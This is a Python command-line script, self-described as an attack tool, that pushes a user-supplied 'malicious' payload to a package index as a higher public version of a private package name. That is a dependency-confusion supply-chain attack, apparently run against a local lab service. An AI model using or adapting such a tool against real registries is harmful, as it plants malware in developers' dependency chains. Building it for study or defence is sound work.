"""Attack CLI that writes a malicious public version through the service."""

from __future__ import annotations

import argparse
import sys
from datetime import datetime, timezone
from pathlib import Path

from .client import ApiError, IndexClient, IndexUnavailable
from .versions import parse_version


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="向公共仓库注入私有同名包的高版本")
    parser.add_argument("--package", "--name", dest="package", required=True)
    parser.add_argument("--version", required=True)
    parser.add_argument("--payload", required=True, help="恶意制品内容；@file 可读取文本文件")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--log", default="inject.log")
    return parser


def _timestamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def append_log(path: Path, outcome: str, package: str, version: str, detail: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8", newline="\n") as handle:
        handle.write(
            f"{_timestamp()} {outcome} package={package} version={version} {detail}\n"
        )


def _read_payload(value: str) -> str:
    if value.startswith("@"):
        return Path(value[1:]).read_text(encoding="utf-8")
    return value


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    log_path = Path(args.log)
    try:
        payload = _read_payload(args.payload)
    except OSError as exc:
        append_log(log_path, "FAILURE", args.package, args.version, f"reason=payload_error:{exc}")
        print(f"注入失败: 无法读取 payload: {exc}", file=sys.stderr)
        return 1
    if not payload:
        append_log(log_path, "FAILURE", args.package, args.version, "reason=empty_payload")
        print("注入失败: payload 不能为空", file=sys.stderr)
        return 1
    try:
        parse_version(args.version)
    except ValueError as exc:
        append_log(log_path, "FAILURE", args.package, args.version, f"reason=invalid_version:{exc}")
        print(f"注入失败: {exc}", file=sys.stderr)
        return 1

    client = IndexClient(args.base_url)
    try:
        client.status()
        result = client.inject(args.package, args.version, payload)
    except IndexUnavailable as exc:
        append_log(
            log_path,
            "FAILURE",
            args.package,
            args.version,
            f"reason=index_unavailable:{exc}",
        )
        print(f"索引服务不可达: {exc}", file=sys.stderr)
        return 2
    except ApiError as exc:
        append_log(
            log_path,
            "FAILURE",
            args.package,
            args.version,
            f"reason=api_error:{exc.status}:{exc}",
        )
        print(f"注入失败: {exc}", file=sys.stderr)
        return 1

    append_log(
        log_path,
        "SUCCESS",
        args.package,
        args.version,
        f"sha256={result.get('sha256', '')}",
    )
    print(
        f"注入成功: {result.get('name', args.package)}=={result.get('version', args.version)} "
        f"sha256={result.get('sha256', '')}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
